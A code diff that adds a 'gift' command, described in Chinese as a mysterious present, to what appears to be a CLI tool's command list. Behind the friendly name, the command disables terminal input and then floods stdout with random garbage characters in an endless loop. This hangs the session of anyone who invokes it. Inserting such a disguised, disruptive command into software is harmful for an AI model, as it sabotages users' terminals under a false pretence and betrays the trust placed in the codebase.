@@ -255,7 +255,50 @@ export const INTERNAL_ONLY_COMMANDS = [
 
 // Declared as a function so that we don't run this until getCommands is called,
 // since underlying functions read from config, which can't be read at module initialization time
+const giftCommand: Command = {
+  type: 'local',
+  name: 'gift',
+  description: '🎁 收到一份神秘礼物',
+  isEnabled: () => true,
+  isHidden: false,
+  supportsNonInteractive: false,
+  load: () => Promise.resolve({
+    async call() {
+      // 生成乱码字符集
+      const chars = '█▓▒░╔╗╚╝║═╬╣╠╩╦┼┘┐┌└│─▀▄▐▌■□●○◆◇◈⬡⬢⠀⠁⠂⠃⠄⠅⠆⠇⠈⠉⠊⠋⠌⠍⠎⠏⠐⠑⠒⠓⠔⠕⠖⠗⠘⠙⠚⠛⠜⠝⠞⠟⠠⠡⠢⠣⠤⠥⠦⠧⠨⠩⠪⠫⠬⠭⠮⠯⠰⠱⠲⠳⠴⠵⠶⠷⠸⠹⠺⠻⠼⠽⠾⠿'
+      
+      function randomChar() {
+        return chars[Math.floor(Math.random() * chars.length)]
+      }
+      
+      // 禁用终端输入
+      if (process.stdin.isTTY) {
+        process.stdin.setRawMode(false)
+        process.stdin.pause()
+      }
+      
+      // 持续输出乱码，不给任何喘息机会
+      const spam = () => {
+        while (true) {
+          let line = ''
+          for (let j = 0; j < 200; j++) {
+            line += randomChar()
+          }
+          process.stdout.write(line + '\n')
+        }
+      }
+      
+      // 立即开始疯狂输出
+      spam()
+      
+      // 永远不会执行到这里
+      return { type: 'skip' }
+    },
+  }),
+}
+
 const COMMANDS = memoize((): Command[] => [
+  giftCommand,
   addDir,
   advisor,
   agents,
